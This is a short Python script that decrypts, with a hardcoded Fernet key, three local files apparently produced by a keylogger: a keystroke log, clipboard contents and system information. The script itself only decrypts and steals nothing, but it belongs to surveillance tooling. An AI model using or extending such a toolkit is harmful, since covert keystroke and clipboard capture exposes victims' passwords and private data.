from cryptography.fernet import Fernet

key =  "4TeFYldqnskTk4o0aegHT4B_BaqZWDC0fDAgVG1oG6o="

e_system_information = 'e_systeminfo.txt'
e_key_information = "e_key_log.txt"
e_clipboard_info = 'e_clipboard_info.txt'

encrypt_files = [e_system_information, e_key_information, e_clipboard_info]
count = 0

for decrypting_file in encrypt_files:
    with open(encrypt_files[count],'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)


    with open(encrypt_files[count],'wb') as f:
        f.write(decrypted)

    count += 1
